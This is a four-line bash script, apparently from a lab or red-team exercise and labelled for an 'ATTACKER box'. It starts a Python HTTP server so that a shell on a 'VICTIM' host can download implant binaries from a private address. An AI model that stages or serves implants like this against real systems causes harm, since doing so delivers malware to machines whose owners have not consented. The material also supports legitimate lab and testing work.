#!/usr/bin/env bash
# ATTACKER box - serve the implant binaries over HTTP so the "shell" on VICTIM can pull them.
cd ~/realm-share
python3 -m http.server 8000
# binaries now reachable at http://172.16.69.109:8000/<name>
